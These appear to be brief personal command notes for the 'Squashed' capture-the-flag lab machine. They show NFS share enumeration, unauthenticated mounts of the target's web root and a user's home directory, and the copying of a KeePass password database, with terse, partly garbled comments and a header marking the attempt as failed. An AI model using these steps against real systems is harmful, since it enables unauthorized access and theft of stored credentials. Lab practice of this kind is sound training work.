# Squashed CMD-by-CMDs

## FAILS - Learn Rescan this box!
## FAILS - DO not READ WRITEUP

```bash
sed -i 's///g' *-CMD-by-CMDs.md
```

```bash
showmount -e 10.10.11.191
# We do not need flags for -o because reasons?
# If we provided flags it will the owner will be 2017 and ww-data and su to www-data wont work.
sudo mount -t nfs 10.10.11.191:/var/www/html /mnt/web -nolock
# Does not require authenication even though it is ver4
sudo mount -t nfs -o rw,vers=4 10.10.11.191:/home/ross /mnt/ -nolock
cp /mnt/Documents/Passwords.kdbx .




```


